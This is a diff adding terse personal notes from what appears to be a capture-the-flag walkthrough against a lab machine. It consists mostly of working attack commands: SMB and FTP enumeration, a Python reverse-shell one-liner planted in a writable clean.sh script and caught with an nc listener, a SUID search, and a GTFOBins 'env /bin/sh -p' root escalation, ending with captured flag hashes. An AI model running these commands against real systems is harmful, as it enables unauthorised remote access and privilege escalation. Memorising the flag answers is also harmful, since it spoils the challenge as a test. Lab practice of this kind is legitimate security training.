@@ -1,0 +1,31 @@
+Date:mar/9/2021
+Time:21:30
+
+smbclient -N -L 10.10.190.56 
+use "get" to get anything from ftp it save into lcd means the present 
+directory
+[wget -r ftp://10.10.190.56]all files will download
+get clean.sh
+nano clean.sh                                                          1 ⚙
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.65.134",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+cat clean.sh
+liki$rlwrap nc -lvnp 4242 
+ftp> put clean.sh
+boom! access done 
+cat user.txt
+ans:90d6f992585815ff991e68748c414740
+namelessone@find / -perm -u=s -type f 2>/dev/null [source:suid cheat sheet lineno:372]
+
+search gtfobins env > suid 
+namelessone@env /bin/sh -p
+cd /root
+ls
+ls
+root.txt
+cat root.txt
+cat root.txt
+ans:4d930091c31a622a7ed10f27999af363
+
+
+
+
